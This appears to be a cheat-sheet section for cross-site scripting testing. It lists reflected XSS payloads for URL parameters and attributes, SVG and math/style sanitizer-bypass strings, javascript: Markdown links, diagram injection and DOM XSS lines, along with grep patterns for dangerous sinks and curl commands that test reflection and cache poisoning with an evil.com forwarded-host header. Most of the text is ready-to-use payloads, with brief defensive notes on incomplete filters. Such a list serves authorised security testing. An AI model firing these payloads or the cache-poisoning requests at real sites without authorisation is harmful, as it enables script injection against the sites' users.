## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context:**
- Treat `value`, `name`, `id`, `class`, `title`, `alt`, `placeholder`, and `label` as separate contexts.
- Event-handler attributes such as `onmouseover` and `onerror` are executable sinks, not safe attributes.
- A benign canary such as `aaa"bbb'ccc` shows whether delimiters are encoded; it is not an XSS finding by itself.

```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**Escape Function Missing / Incomplete Filter**
- Replacing one character, or only the first occurrence, is not a defense. `replaceall()` is not a JavaScript API, and `replaceAll()` still does not provide context-aware XSS protection.
- Test each context separately (HTML body, quoted attribute, JavaScript, CSS, URL, DOM sink); a filter that only handles one context is still incomplete.

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.com/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page" | grep -i "evil.com"
```

---

